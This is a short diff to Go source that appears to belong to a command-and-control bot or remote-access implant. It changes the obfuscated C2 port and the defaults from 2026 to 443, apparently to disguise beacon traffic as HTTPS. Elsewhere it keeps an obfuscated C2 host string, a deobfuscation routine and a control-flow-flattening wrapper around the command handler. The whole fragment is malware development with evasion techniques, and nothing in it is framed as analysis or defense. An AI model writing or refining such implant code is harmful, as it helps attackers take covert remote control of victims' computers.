@@ -78,8 +78,8 @@ var (
 	instanceLock                                               sync.Mutex
 	lockFile                                                   = ""
 	obfC2Host                                                  = "05671e47373f66425235051056250346165902127c1c7d1a570a691e3d5e2043220a7e0451270959"
-	obfPortStr                                                 = "2a5a334d20000d4f"
-	// When true (build tag localtest + lastfinalversion2_localtest.go), C2 defaults to 127.0.0.1:2026; C2_HOST / C2_PORT still override.
+	obfPortStr                                                 = "2974234e"
+	// When true (build tag localtest + lastfinalversion2_localtest.go), C2 defaults to 127.0.0.1:443; C2_HOST / C2_PORT still override.
 	c2LocalTestMode bool
 )
 
@@ -1985,13 +1985,13 @@ func getPort() int {
 		}
 	}
 	if c2LocalTestMode {
-		return 2026
+		return 443
 	}
 	portStr := deobfuscateString(obfPortStr)
 	if v, err := strconv.Atoi(portStr); err == nil {
 		return v
 	}
-	return 2026
+	return 443
 }
 
 // Control flow flattening wrapper for handleCmd (junk branches)
